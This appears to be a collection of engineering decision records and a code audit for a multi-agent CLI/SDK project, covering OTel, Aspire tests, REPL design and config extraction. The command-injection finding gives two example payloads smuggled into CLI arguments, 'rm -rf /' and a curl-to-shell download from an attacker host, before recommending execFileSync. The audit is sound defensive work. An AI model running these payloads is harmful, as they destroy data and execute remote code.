Local upstreams read "live" from the filesystem (no copy, no snapshot). Git upstreams have an explicit `sync` command. This asymmetry means local upstream changes propagate immediately and silently, while git upstream changes require an explicit action. Document this as an intentional design choice, not an implicit one. Consider adding a `--snapshot` flag for reproducibility.

#### 7. Clarify `type: 'export'` relationship with sharing module

The sharing module already defines `ExportBundle` as the portable format. Is the `export` upstream type reading an `ExportBundle`? If so, the types should reference `ExportBundle` directly. If it's a different format, document the distinction.

### What's Good

- **SDK/CLI split is correct.** Types and resolver in SDK, commands in CLI. One-way dependency. Follows the established pattern perfectly.
- **`.squad/upstream.json` is the right location.** Consistent with `casting-policy.json`. Structured JSON config in `.squad/`.
- **Closest-wins conflict resolution is sound.** Predictable, intuitive, matches CSS cascade mental model.
- **Test coverage is solid.** 14 unit tests + 3-level hierarchy E2E test validates the core use case.
- **Git caching in `.squad/_upstream_repos/`** follows the "all state in .squad/" rule. Underscore prefix signals internal/generated.

### Summary

The architecture compounds correctly — this makes org-level governance, team-level conventions, and repo-level overrides a natural composition. Fix the four required items and this is a clean merge.
### 2026-02-22T10:31:23Z: User directive — squad-pr repository scope
**By:** Brady (via Copilot)
**What:** **This squad works on `bradygaster/squad-pr` ONLY — not `bradygaster/squad`. Until further notice, all issue tracking, PRs, and work target the squad-pr repository.**
**Why:** User request — captured for team memory

### 2026-02-22T10:39:51Z: User directive — Work priority order
**By:** Brady (via Copilot)
**What:** Priority order for remaining work: (1) OTel + Aspire dashboard, (2) Fix the squad REPL experience, (3) CI/CD for npm publishing with GitHub Actions + releases, (4) Docs and website — last. SquadOffice repo at C:\src\SquadOffice has a telemetry watcher UI whose telemetry expectations should be integrated into OTel work if possible. Changes to that repo are welcome too.
**Why:** User request — captured for team memory


### Aspire + Observer patterns — Fenster (2026-02-22)

**Context:** OTel Phase 4 — Issues #265, #268

**Decisions made:**

1. **Aspire command uses Docker by default** when dotnet Aspire workload isn't detected. Docker is more portable and doesn't require .NET SDK installation. The `--docker` flag forces Docker even when dotnet is available.

2. **SquadObserver uses `fs.watch` with recursive:true** instead of chokidar or other watchers. Zero additional dependencies, works on Windows/macOS natively. Linux users may need to increase inotify watchers for large .squad/ directories.

3. **File classification is string-based prefix matching** on the relative path from .squad/ root. Categories: agent, casting, config, decision, skill, unknown. Windows backslashes are normalized to forward slashes before classification.

4. **Observer emits `agent:milestone` EventBus events** for file changes rather than introducing a new event type. This keeps compatibility with existing EventBus subscribers (SquadOffice expects `agent:milestone`). The payload includes `action: 'file_change'` to distinguish from other milestones.

5. **Debounce at 200ms default** to avoid flooding spans on rapid file saves (e.g., editor autosave). Configurable via `debounceMs` option.

### REPL Shell Coordinator Wiring — Architecture Decision
**By:** Fortier
**Date:** 2026-02-22
**Issue:** #303

**What:** The REPL shell dispatch logic lives in the shell entry point (`index.ts`), not inside the Ink component (`App.tsx`). The App component receives an `onDispatch` async callback and is purely UI. SDK session management (creation, reuse, streaming event wiring, cleanup) is handled in closures within `runShell()`.

**Why:**
1. **Separation of concerns** — React components shouldn't own SDK connections. The entry point has the right lifecycle scope for client/session management.
2. **Streaming-first** — Session events (`message_delta`) feed directly into `shellApi.setStreamingContent()` for live incremental rendering. No polling, no buffering layer needed for the basic path.
3. **Session reuse** — Agent sessions are cached by name in a `Map<string, SquadSession>`. First message creates the session with the agent's charter as system prompt; subsequent messages reuse it. Coordinator gets its own persistent session.
4. **StreamBridge preserved** — The existing StreamBridge infrastructure stays in place for future `StreamingPipeline` integration. The direct `session.on()` → `shellApi` path handles the immediate need without coupling to the pipeline.

**Impact:** All agents should know that `@Agent message` and free-form input now route through real SDK sessions. Slash commands remain sync and component-local.

# Decision: OTel SDK v2 test patterns

**By:** Hockney
**Date:** 2026-02-23
**Issue:** #267

## Context

While writing OTel integration E2E tests, discovered that `@opentelemetry/sdk-trace-base` v2.x has breaking API differences from v1 that affect test patterns.

## Decisions

1. **Use `parentSpanContext` not `parentSpanId`**: In SDK v2, `ReadableSpan.parentSpanId` is always `undefined`. The parent linkage is on `parentSpanContext.spanId` instead. All tests verifying span hierarchy must use `(span as any).parentSpanContext?.spanId`.

2. **Require `AsyncLocalStorageContextManager` for context propagation in tests**: `BasicTracerProvider` alone does NOT propagate context. Import `AsyncLocalStorageContextManager` from `@opentelemetry/context-async-hooks`, call `.enable()` in `beforeEach`, and `.disable()` in `afterEach`. Without this, `trace.setSpan()` creates contexts but `startSpan(name, opts, ctx)` ignores the parent.

3. **EventBus bridge is tested via manual pattern**: `bridgeEventBusToOTel` is defined in `otel-init.ts` imports but not yet exported from `otel-bridge.ts`. Tests use the manual `bus.subscribeAll()` → `tracer.startSpan()` pattern, which validates the expected contract. When `bridgeEventBusToOTel` ships, tests should be updated to call it directly.

## Impact

All agents writing OTel tests must follow these patterns or tests will silently pass with broken assertions.

| `packages/squad-sdk/src/config/migrations/index.ts` | Multiple migration versions each redefine model lists | MEDIUM |

**Suggested Fix:**
- Extract single `models.ts` constant: `TIER_FALLBACK_CHAINS` (centralized)
- Import and re-export from `runtime/config.ts` (config module)
- Update all 6 files to import from central location
- Add comment: "Model lists must be updated in models.ts and nowhere else"

**Security Impact:** None. **Cost Impact:** Maintenance burden increases as new models are added; must edit 6 places instead of 1.

---

### Category 1.2: Default Model Selection

**Finding:** Default model hardcoded as `'claude-haiku-4.5'` in model-selector.ts line 77, but configured as `'claude-sonnet-4.5'` in runtime/config.ts line 319.

| File | Line | Value | Issue | Priority |
|------|------|-------|-------|----------|
| `packages/squad-sdk/src/agents/model-selector.ts` | 77 | `'claude-haiku-4.5'` | Cost-first default | MEDIUM |
| `packages/squad-sdk/src/runtime/config.ts` | 319 | `'claude-sonnet-4.5'` | Standard default in config | MEDIUM |

**Suggested Fix:**
- Decide: is default cost-first (haiku) or balanced quality/cost (sonnet)?
- Store in central `models.ts` constant: `DEFAULT_MODEL`
- Import in both files
- Add environment variable override: `SQUAD_DEFAULT_MODEL` (for deployments)

**Impact:** Silent inconsistency; agents using model-selector.ts fallback to different default than those reading config.

---

### Category 1.3: Timeouts & Retry Logic

**Finding:** Timeout values hard-coded in multiple places, no environment variable overrides.

| File | Line | Timeout Value | Context | Priority |
|------|------|---------------|---------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | 57 | 5000 ms | Health check default | MEDIUM |
| `packages/squad-sdk/src/runtime/health.ts` | 101 | 0.8 × timeout | Degraded threshold (80% of timeout) | MEDIUM |
| `packages/squad-sdk/src/agents/lifecycle.ts` | Mentioned in comments | 5 minutes | Idle timeout for agents | MEDIUM |
| `packages/squad-sdk/src/coordinator/response-tiers.ts` | 28-31 | 0, 30, 120, 300 seconds | Per-tier timeouts (immediate, short, medium, long) | HIGH |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120, 121, 173 | 60000 ms | Git clone/pull timeout | MEDIUM |
| `packages/squad-cli/src/cli/commands/plugin.ts` | Line ~115 | 15000 ms | Plugin marketplace timeout | LOW |

**Suggested Fix:**
- Create `packages/squad-sdk/src/runtime/constants.ts` with all timeout values
- Define environment variable schema:
  ```typescript
  const TIMEOUTS = {
    HEALTH_CHECK_MS: parseInt(process.env.SQUAD_HEALTH_CHECK_MS ?? '5000', 10),
    GIT_CLONE_MS: parseInt(process.env.SQUAD_GIT_CLONE_MS ?? '60000', 10),
    // ...
  };
  ```
- Update all references to import from constants
- Document in `.squad/decisions.md`

**Impact:** Operations teams cannot tune timeouts without code changes. CI failures in flaky networks require recompilation.

---

### Category 1.4: Agent Role Names & Hardcoded Mappings

**Finding:** Agent roles and role-to-model mappings are not configuration-driven.

| File | Issue | Line | Priority |
|------|-------|------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | Role type defined as string union: `'lead' \| 'developer' \| 'tester' \| 'designer' \| 'scribe' \| 'coordinator'` | Line 46 | MEDIUM |
| `packages/squad-cli/src/cli/commands/watch.ts` | Role-to-work routing hardcoded in routing function (lines ~350-380) | Domain-based matching: frontend→designer, backend→developer, test→tester | MEDIUM |
| `packages/squad-cli/src/cli/shell/spawn.ts` | Agent charter parsing for role requires exact markdown format | Line ~120 "## Name — Role" | LOW |

**Suggested Fix:**
- Move role definitions to `packages/squad-sdk/src/config/roles.ts`
- Add `AGENT_ROLES` constant: `['lead', 'developer', 'tester', 'designer', 'scribe', 'coordinator']`
- Extract watch.ts domain-based routing into routing configuration (decouple from CLI command)
- Add environment variable: `SQUAD_ROLE_ALIASES` for custom role naming in other Copilot universes

**Impact:** Casting policy depends on these roles; hardcoding makes it brittle to team composition changes.

---

### Category 1.5: Port & Host Assumptions

**Finding:** OTLP and local server endpoints reference localhost with no configurable fallback.

| File | Line | Value | Context | Priority |
|------|------|-------|---------|----------|
| `packages/squad-sdk/src/runtime/otel.ts` | ~Line 12-15 (type definition) | `http://localhost:4318` | OTLP endpoint example/default | LOW |

**Note:** The SDK type definition shows `http://localhost:4318` in the JSDoc comment. This is documentation, not hard-coded behavior, so **low priority** but worth standardizing.

**Suggested Fix:**
- Add to constants: `OTLP_DEFAULT_ENDPOINT = process.env.SQUAD_OTLP_ENDPOINT ?? 'http://localhost:4318'`
- Update JSDoc to reference environment variable

---

## PART 2: CODE QUALITY ISSUES

### Category 2.1: Command Injection (CWE-78) ⚠️ **CRITICAL**

**Finding:** `execSync` with template-string interpolation of user input.

| File | Line | Code | Input | Risk | Priority |
|------|------|------|-------|------|----------|
| `packages/squad-cli/src/cli/commands/upstream.ts` | 120 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...) `` | `ref` from CLI args, `source` from upstream config, `cloneDir` derived from name | **HIGH: shell injection via ref or cloneDir naming** | **CRITICAL** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 121 | `` execSync(`git -C "${cloneDir}" pull --ff-only`, ...) `` | `cloneDir` derived from upstream name (user-configurable) | **MEDIUM: directory traversal in cloneDir** | **HIGH** |
| `packages/squad-cli/src/cli/commands/upstream.ts` | 173 | `` execSync(`git clone --depth 1 --branch ${ref} --single-branch "${upstream.source}" "${cloneDir}"`, ...) `` | Same as line 120 | **HIGH** | **CRITICAL** |

**Attack Scenario:**
```bash
# Attacker creates upstream with name: "test; rm -rf /"
squad upstream add https://github.com/user/repo --name "test; rm -rf /"

# Or upstream with ref: "main && curl http://attacker.com/payload | sh"
squad upstream add https://github.com/user/repo --ref "main && curl http://attacker.com/payload | sh"
```

**Suggested Fix:**
Use `execFileSync` with array arguments (no shell interpretation):
```typescript
import { execFileSync } from 'node:child_process';

// Before (vulnerable):
execSync(`git clone --depth 1 --branch ${ref} "${source}" "${cloneDir}"`);

// After (safe):
execFileSync('git', [
  'clone',
  '--depth', '1',
  '--branch', ref,      // Safe: passed as argument, not interpolated
  '--single-branch',
  source,               // Safe
  cloneDir              // Safe
], { stdio: 'pipe', timeout: 60000 });
```

**Impact:** Remote code execution if upstream name/ref can be controlled by attacker or partially-trusted user.

---

### Category 2.2: Error Handling Inconsistency

**Finding:** Two error functions with overlapping semantics, inconsistent usage.

| Function | File | Definition | Behavior | Usage Count |
|----------|------|-----------|----------|------------|
| `fatal()` | `packages/squad-cli/src/cli/core/errors.ts` | Throws `SquadError`, exits with code 1 | Deterministic exit | ~25 call sites |
| `error()` | `packages/squad-cli/src/cli/core/output.ts` | Console.error with red emoji | Does NOT exit | ~12 call sites |

**Problematic Pattern in upstream.ts:**
```typescript
import { success, warn, info, error as fatal } from '../core/output.js';
// Line 65: fatal('Usage: squad upstream add|remove|list|sync');
// This calls error() (doesn't exit!), not the real fatal()
```

**Suggested Fix:**
1. Rename `error()` in output.ts to `errorLog()` (non-fatal, does not exit)
2. Remove alias: `import { error as fatal }` 
3. Use proper `fatal()` from errors.ts for CLI exit scenarios
4. Codify pattern:
   - `fatal()` = Error + exit (file not found, permission denied, invalid args)
   - `error()` / `errorLog()` = Warning/issue during operation but continue (file not readable, GitHub API rate limit)

**Impact:** Users confused by "Usage:" messages that don't exit, or CLI continues when it should fail.

---

### Category 2.3: TODO / FIXME / HACK Comments

**Finding:** Incomplete implementation markers left in production code.

| File | Line(s) | Comment | Priority |
|------|---------|---------|----------|
| `packages/squad-cli/src/cli/shell/spawn.ts` | ~130 | `// TODO: Wire to CopilotClient session API` | HIGH |
| `packages/squad-sdk/src/tools/index.ts` | ~42 | `// TODO: Parent span context propagation` | MEDIUM |
| `packages/squad-cli/src/cli/core/upgrade.ts` | 5 lines with `# TODO:` | Template placeholders: "TODO: Add your build/test/release commands" | LOW (by design — user-facing placeholders, not code debt) |
| `packages/squad-cli/src/cli/core/workflows.ts` | Similar | Template placeholders | LOW |

**Suggested Fix:**
- Spawn.ts TODO: Create GitHub issue #XXX, link in comment, assign to Fenster
- Tools.ts TODO: Create GitHub issue, mark as P1 (blocking telemetry)
- Upgrade/workflows.ts: These are **template literals for users** (not code debt); safe to leave as-is

**Impact:** spawn.ts returns stub instead of real LLM session — testing infrastructure depends on this being wired.

---

### Category 2.4: Unused Imports

**Finding:** Some imports may be unused (low-signal issue, requires code flow analysis to confirm).

**Files with potential unused imports:**
- `packages/squad-sdk/src/index.ts` line 7: `import { createRequire } from 'module'` — may be used for CJS compatibility shims
- Multiple files import `from 'node:fs'` and `from 'fs/promises'` — both used for different operations

**Suggested Fix:** Run TypeScript compiler in strict mode with `noUnusedLocals` flag. Current tsconfig.json likely has it off. Verify and enable if missing.

---

### Category 2.5: Casting Policy Hard-Coded Universes

**Finding:** Universe allowlist is hard-coded in config, not loaded from team/casting context.

| File | Line | Universes | Priority |
|------|------|-----------|----------|
| `packages/squad-sdk/src/runtime/config.ts` | 349-365 | 15 universes hardcoded: "The Usual Suspects", "Breaking Bad", "The Wire", etc. | MEDIUM |

**Issue:** When team decides to adopt a different universe (e.g., "The Office"), config must be edited and redeployed. No one-off override.

**Suggested Fix:**
- Load universe allowlist from `.squad/casting.json` (team config) as primary source
- Fall back to DEFAULT_CONFIG for new installations
- Add environment variable: `SQUAD_UNIVERSES` (comma-separated override)

**Impact:** Low for now (universe doesn't affect functionality), but violates the "config extraction" theme of Issue #306.

---

## PART 3: TEST COVERAGE GAPS

### Finding: Untested Public API Functions

**Category 3.1: SDK Runtime API**

| Module | Function | Status | Issue | Priority |
|--------|----------|--------|-------|----------|
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.check()` | **No dedicated test** | Critical for startup validation (M0-8) | HIGH |
| `packages/squad-sdk/src/runtime/health.ts` | `HealthMonitor.getStatus()` | **No dedicated test** | Used for monitoring dashboards | MEDIUM |
| `packages/squad-sdk/src/agents/model-selector.ts` | `resolveModel()` | Has tests (models.test.ts exists) | ✅ Covered | — |
| `packages/squad-sdk/src/agents/model-selector.ts` | `ModelFallbackExecutor.execute()` | **Partial coverage** (only happy path, no cross-tier fallback tests) | Missing: tier ceiling enforcement, provider preference | HIGH |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfig()` async | Covered in config.test.ts | ✅ | — |
| `packages/squad-sdk/src/runtime/config.ts` | `loadConfigSync()` | **No test** | Used in startup path | MEDIUM |

**Suggested Fix:**
1. Create `test/health.test.ts` with:
   - Health check success case
   - Health check timeout case
   - Health check degraded (slow response) case
   - Diagnostic logging verification

2. Expand `test/models.test.ts` with:
   - Cross-tier fallback tests (standard→fast allowed, standard→premium denied unless allowCrossTier)
   - Provider preference tests (prefer Claude over GPT-5 when tier matches)

3. Add `loadConfigSync()` test case in `test/config.test.ts`

---

### Category 3.2: CLI Integration Tests

| Command | Coverage Status | Gap | Priority |
|---------|-----------------|-----|----------|
| `squad upstream add` | Exists: `test/cli/upstream.test.ts` | ✅ | — |
| `squad upstream sync` | **Partial** (only local sources tested, git clone not exercised) | Add git clone test (mock execSync) | HIGH |
| `squad export` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad import` | Exists: `test/cli/export-import.test.ts` | ✅ | — |
| `squad init` | Exists: `test/cli/init.test.ts` | ✅ | — |
| `squad upgrade` | Exists: `test/cli/upgrade.test.ts` | ✅ | — |
| `squad watch` | **Partial** (no actual GitHub issue triage tested, only setup) | Add GitHub API mocking for triage logic | MEDIUM |
| `squad loop` (new name for watch) | Not yet renamed | Issue #269 awaits implementation | LOW |
| Interactive shell (`squad` no args) | **Minimal** (test/shell.test.ts exists but covers rendering only) | Add coordinator integration, agent spawning, streaming | HIGH |

**Suggested Fix:**
1. Mock `execSync` in upstream.test.ts, add git clone failure recovery test
2. Add GitHub API mock (using `nock` or similar) for watch.test.ts
3. Create `test/shell-integration.test.ts` for:
   - End-to-end shell startup
   - User input → coordinator routing
   - Agent spawning (stub session)
   - Output stream verification

---

### Category 3.3: SDK Adapter Tests

| API | Coverage | Issue | Priority |
|-----|----------|-------|----------|
| `SquadClient.ping()` | Tested in adapter-client.test.ts | ✅ | — |
| `SquadClient` error recovery | Tested | ✅ | — |
| `CopilotClient` integration (real SDK) | **No test** (SDK is optional dependency) | Optional but should verify integration path | LOW |

---

## PART 4: EMPATHY & ACCESSIBILITY AUDIT

### Finding 4.1: Generic Error Messages

**File:** `packages/squad-cli/src/cli/commands/watch.ts` line ~330  
**Message:** `"Check failed: ${err.message}"`  
**Issue:** User doesn't know if GitHub API failed, invalid team.md, or network issue.

**Suggested Fix:**
```typescript
// Before:
console.error(`Check failed: ${err.message}`);

// After:
if (err.message.includes('GitHub')) {
  console.error(`Check failed: GitHub API error. Run 'gh auth login' to verify credentials.`);
} else if (err.message.includes('squad')) {
  console.error(`Check failed: Invalid squad configuration. Run 'squad init' to fix.`);
} else {
  console.error(`Check failed: ${err.message}. Run with DEBUG=squad:* for details.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.2: Hardcoded Timeout Values Affect User Experience

**File:** `packages/squad-sdk/src/runtime/health.ts` line 57  
**Hardcoded:** `5000 ms` (5 second health check timeout)

**Issue:** In slow networks or CI, 5 seconds may be insufficient. Users see "Health check timeout" with no way to adjust.

**Suggested Fix:** Already noted in Category 1.3 (Timeouts & Retry Logic). Add:
```bash
export SQUAD_HEALTH_CHECK_MS=15000  # 15 seconds for slow CI
squad  # Uses 15-second timeout
```

**Priority:** MEDIUM

---

### Finding 4.3: Quiet CLI Failures (RESPONSE ORDER mitigation needed)

**Files affected:** Multiple CLI commands use `execSync`, `fs.readFileSync` without explicit error handling.

**Example:** If `.squad/team.md` is missing, watch.ts crashes with a stack trace instead of "Run 'squad init' first".

**Suggested Fix:** Wrap all file reads with descriptive context:
```typescript
// Before:
const teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');

// After:
let teamMd: string;
try {
  teamMd = fs.readFileSync(path.join(squadDir, 'team.md'), 'utf-8');
} catch (err) {
  fatal(`Missing team.md in ${squadDir}. Run 'squad init' to initialize your squad.`);
}
```

**Priority:** MEDIUM

---

### Finding 4.4: Windows Path Separator Inconsistency

**Files:** `packages/squad-cli/src/cli/commands/copilot.ts` line ~115  
```typescript
? currentFileUrl.pathname.substring(1) // Remove leading / on Windows
```

**Issue:** Hard-coded path manipulation that may break on non-Windows or certain terminal environments.

**Suggested Fix:** Use `path.normalize()` and Path utilities instead of string manipulation.

**Priority:** LOW (edge case)

---

### Finding 4.5: No Debug/Verbose Logging

**All CLI commands**  
**Issue:** Users report issues but have no way to see what the CLI is doing (network calls, file reads, git operations).

**Suggested Fix:**
```bash
# Enable verbose logging
export DEBUG=squad:*
squad watch  # Shows: "[squad:watch] Reading team.md...", "[squad:watch] GitHub API: GET /repos/owner/repo/issues", etc.
```

Use Node.js `debug` package (lightweight, zero-runtime cost if disabled).

**Priority:** MEDIUM (improves troubleshooting, not a bug)

---

## PART 6: RECOMMENDED CLEANUP SEQUENCING

### Phase 1 (Critical): Security & Stability (Week 1)
1. **FIX**: Command injection in upstream.ts (CWE-78) — Use `execFileSync`
2. **FIX**: Error handling inconsistency in upstream.ts — Use correct `fatal()` function
3. **TEST**: Add upstream git clone tests with mock execSync

### Phase 2 (High): Configuration Extraction (Week 2-3)
1. **EXTRACT**: Model names → central `models.ts` constant
2. **EXTRACT**: Timeouts → `constants.ts` with environment variable overrides
3. **EXTRACT**: Agent roles → `roles.ts` configuration
4. **CONFIG**: Universe allowlist → load from `.squad/casting.json`
5. **UPDATE**: 6 files to import from central locations

### Phase 3 (High): Test Coverage (Week 3-4)
1. **ADD**: `test/health.test.ts` (HealthMonitor.check, timeout scenarios)
2. **EXPAND**: `test/models.test.ts` (cross-tier fallback rules)
3. **ADD**: `test/cli/upstream.test.ts` git clone mock tests
4. **ADD**: `test/shell-integration.test.ts` (end-to-end shell + coordinator)

### Phase 4 (Medium): Error Messages & UX (Week 4-5)
1. **IMPROVE**: Generic error messages in watch.ts (GitHub vs. squad context)
2. **ADD**: DEBUG logging infrastructure
3. **FIX**: Quiet failure scenarios (missing files → descriptive errors)
4. **CONFIG**: Timeout environment variable documentation

### Phase 5 (Low/Optional): Code Cleanup
1. Run TypeScript strict mode check (noUnusedLocals)
2. Remove old TODO comments where issues are created
3. Path separator normalization for cross-platform consistency

# Decision: OTel 3-Layer Public API Export

**By:** Kujan (SDK Expert)
**Date:** 2025-07-19
**Issue:** #266

## Context

SDK consumers need instrumented Squad telemetry that flows through their own OTel providers. The OTel internals existed but weren't fully surfaced as a coherent public API.

## Decision

Export a **3-layer OTel API** from `src/index.ts`:

| Layer | Function | Module | Purpose |
|-------|----------|--------|---------|
| Low | `initializeOTel()`, `shutdownOTel()`, `getTracer()`, `getMeter()` | `otel.ts` | Direct OTel control |
| Mid | `bridgeEventBusToOTel(bus)` | `otel-bridge.ts` | Wire EventBus → OTel spans |
| High | `initSquadTelemetry(options)` | `otel-init.ts` | One-call setup with lifecycle handle |

### Key choices:
- `initSquadTelemetry` lives in its own module (`otel-init.ts`) to avoid circular imports between `otel.ts` ↔ `otel-bridge.ts`
- `SquadTelemetryOptions` extends `OTelConfig` — backward compatible, additive only
- `installTransport` defaults to `true` so high-level consumers get TelemetryCollector → OTel bridging automatically
- Named exports for bridge/init (not `export *`) to keep the public surface explicit and tree-shakeable

## Zero-overhead guarantee

If no `TracerProvider` / `MeterProvider` is registered, `@opentelemetry/api` returns no-op implementations. All Squad instrumentation becomes zero-cost function calls that get optimized away.


### 2026-02-22T11:08Z: User directive
**By:** Brady (via Copilot)
**What:** Integration tests must launch the Aspire dashboard and validate that OTel telemetry shows up in it. Use Playwright for browser-based validation. Use the very latest Aspire bits. Reference aspire.dev for documentation, NOT learn.microsoft.com. It's "Aspire" not ".NET Aspire" — get that right in all documentation.
**Why:** User request — captured for team memory

# Decision: Aspire Dashboard Playwright Integration Tests

**By:** Saul (Aspire & Observability)
**Date:** 2026-02-22
**Requested by:** Brady

## What

Created `test/aspire-integration.test.ts` — a Playwright + Vitest integration test suite that:

1. Launches the Aspire dashboard container (`mcr.microsoft.com/dotnet/aspire-dashboard:latest`)
2. Configures OTel gRPC export via `@opentelemetry/sdk-node` + `@opentelemetry/exporter-trace-otlp-grpc`
3. Creates Squad-style spans and metrics (session traces, agent traces, counters, histograms)
4. Opens Playwright Chromium browser to the dashboard and validates telemetry appears
5. Tests `squad aspire` command lifecycle (runAspire export, AspireOptions interface, Docker container state)

## 5 Tests

| Test | What it validates |
|------|-------------------|
| traces appear in Aspire dashboard | Span creation → gRPC export → dashboard /traces page renders trace data |
| metrics appear in Aspire dashboard | Counter/histogram recording → gRPC export → dashboard /metrics page renders metric data |
| squad aspire command exists | `runAspire` is exported from `@bradygaster/squad-cli/commands/aspire` |
| AspireOptions with docker flag | Type-level: `{ docker: true, port: 18888 }` compiles |
| Docker lifecycle | Container running, dashboard port 18888 responds, OTLP gRPC port 4317 accepts TCP connections |

## Technical Choices

- **NodeSDK (0.57.2)** over BasicTracerProvider (2.x): Version alignment with gRPC exporters (also 0.57.2) avoids type mismatch
- **Direct URL navigation** over sidebar clicks: Aspire's Fluent UI web components don't match standard selectors reliably
- **Skip guard**: `SKIP_DOCKER_TESTS=1` env var or Docker absence auto-skips the suite — safe for CI without Docker

## Verification

- All 5 tests pass (traces 4.8s, metrics 6.8s, command tests <100ms each)
- Full suite: 2141 tests passing across 79 files
- Build clean, type-check clean


# Decision: Coverage Gap Audit — 114 New Tests

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Status:** Implemented

## What

Created 4 new test files covering critical test gaps identified in audit:

1. **`test/shell-integration.test.ts`** (32 tests) — Shell startup lifecycle, input routing (parseInput), coordinator response parsing (ROUTE/DIRECT/MULTI), session cleanup, graceful degradation when SDK disconnected.
2. **`test/health.test.ts`** (17 tests) — HealthMonitor.check() success/timeout/degraded cases, getStatus() passive checks, diagnostics logging toggle.
3. **`test/model-fallback.test.ts`** (25 tests) — Cross-tier fallback chain exhaustion, tier ceiling enforcement (fast never escalates to premium), provider preference reordering ("use Claude" stays in Claude family), nuclear fallback (all models exhausted → null).
4. **`test/cli/upstream-clone.test.ts`** (40 tests) — Git ref validation (14 injection vectors rejected), upstream name validation, source type detection, git clone arg construction, failure recovery messages, file I/O round-trips, gitignore idempotency.

## Why

Audit identified these as the highest-risk untested paths. Shell integration had zero tests for the end-to-end lifecycle. HealthMonitor had no tests at all. Model fallback had catalog tests but no chain-walk or tier-ceiling tests. Upstream git clone had resolver tests but no validation or error recovery tests.

## Impact

- Test count: 2022 → 2136 (114 new tests, +5.6%)
- Test files: 74 → 78 (4 new files)
- Zero regressions — all 2136 tests pass
- No existing test files modified

## Constraints Respected

- Vitest patterns throughout (describe/it/expect/vi.mock/vi.fn)
- Mock SDK client for health tests — no real Copilot connection
- New test files only — no modifications to existing 74 test files
- Exceeds minimum target of 50 new tests (delivered 114)


# Decision: REPL Shell Polish Architecture

**By:** Fortier
**Date:** 2026-02-22
**Scope:** Shell UI components (`App.tsx`, `AgentPanel.tsx`, `MessageStream.tsx`, `InputPrompt.tsx`, `lifecycle.ts`)

## What

Role emoji mapping and welcome data loading live in `lifecycle.ts` alongside team manifest parsing. UI components import directly from `../lifecycle.js` — no new props needed on the shell entry point (`index.ts`). All filesystem reads happen inside React `useEffect` hooks at mount time.

## Why

- **Single source of team data**: `lifecycle.ts` already owns `parseTeamManifest()`. Adding `getRoleEmoji()` and `loadWelcomeData()` here keeps all team-data concerns in one module. Components don't need to know about `.squad/` directory structure.
- **No SDK wiring changes**: Loading welcome data inside `App.tsx` via `useEffect` avoids any changes to `index.ts` and the coordinator/session wiring. The welcome screen is purely additive UI.
- **Fail-safe**: `loadWelcomeData()` returns `null` on any error. Components gracefully degrade — if `.squad/team.md` or `.squad/identity/now.md` is missing, the header still shows version and hints.

## Team Impact

- **Component authors**: `AgentPanel` now accepts optional `streamingContent` prop; `MessageStream` accepts optional `agents` and `processing` props. Both are backward-compatible (props are optional with defaults).
- **Role emoji map**: New roles should be added to the `map` in `getRoleEmoji()` in `lifecycle.ts`. Unknown roles get `🔹` fallback.
- **ThinkingIndicator**: 80ms `setInterval` runs only while the indicator is mounted. Cleanup is automatic via React effect teardown. No event loop concerns.


### 2026-02-22: spawn.ts wired to SquadClient — self-contained agent spawning
**By:** Fenster (Core Dev)
**Status:** IMPLEMENTED

**What:** `spawnAgent()` in `packages/squad-cli/src/cli/shell/spawn.ts` now accepts an optional `client: SquadClient` via `SpawnOptions`. When a client is provided, it creates a real SDK session (streaming, system prompt from charter, working directory), sends the task message, accumulates streamed `message_delta` events, closes the session, and returns the full response in `SpawnResult`.

**Why:** Phase 3 blocker — spawn was a stub returning a placeholder string. Now it's a working SDK integration that can be used from the Ink shell, coordinator, CLI commands, or any programmatic consumer.

**Design decisions:**
1. **Client via options, not parameter** — Adding `client` to `SpawnOptions` instead of a positional parameter preserves backward compatibility. Callers that don't provide a client get a graceful stub.
2. **Self-contained, no shell dependency** — Unlike `dispatchToAgent()` in shell/index.ts which wires into Ink state (ShellApi, StreamBridge), spawn.ts owns its own session lifecycle. This makes it usable outside the shell.
3. **Session-per-spawn** — Each spawn creates and closes its own session. This is intentional for isolation. Long-lived sessions can be managed externally and passed via a future `session` option if needed.

**Error handling audit (same PR):**
- `plugin.ts`: Removed unused `error` import from output.ts (was dead code, `fatal()` from errors.ts already used correctly).
- `upgrade.ts`: Removed unused `error as errorMsg` import from output.ts (same pattern).
- `upstream.ts`: Has `import { error as fatal } from output.ts` bug — **not touched** (Baer owns it).
- **Convention:** For CLI-exiting errors, use `fatal()` from `cli/core/errors.ts` (throws `SquadError`, returns `never`). For non-fatal operational warnings, `error()` from `output.ts` is fine.

**Files changed:**
- `packages/squad-cli/src/cli/shell/spawn.ts` — Rewired spawnAgent, added client/teamRoot to SpawnOptions
- `packages/squad-cli/src/cli/commands/plugin.ts` — Removed unused error import
- `packages/squad-cli/src/cli/core/upgrade.ts` — Removed unused errorMsg import

**Build:** Clean (0 errors). **Tests:** 47 shell tests passing.


# Decision: Extract hardcoded values to central constants

**Author:** Edie (TypeScript Engineer)
**Date:** 2026-02-22
**Status:** Implemented

## Context

The code audit found model names, timeouts, and role mappings duplicated across 6+ files. Values had already drifted — e.g., `model-selector.ts` had 4-entry fallback chains while `config.ts` and `init.ts` had 3-entry chains with different models. This violated single-source-of-truth and created silent inconsistency risk.

## Decision

Created `packages/squad-sdk/src/runtime/constants.ts` as the canonical source for:

- **`MODELS`** — `DEFAULT`, `SELECTOR_DEFAULT`, `SELECTOR_DEFAULT_TIER`, `FALLBACK_CHAINS` (3 tiers × 4 models each), `NUCLEAR_FALLBACK`, `NUCLEAR_MAX_RETRIES`. All `as const`.
- **`TIMEOUTS`** — `HEALTH_CHECK_MS` (5000), `GIT_CLONE_MS` (60000), `PLUGIN_FETCH_MS` (15000). All env-overridable via `parseInt(process.env[...] ?? default, 10)`.
- **`AGENT_ROLES`** — `readonly` tuple deriving `AgentRole` type.

## Files updated

| File | Change |
|------|--------|
| `runtime/constants.ts` | **Created** — single source of truth |
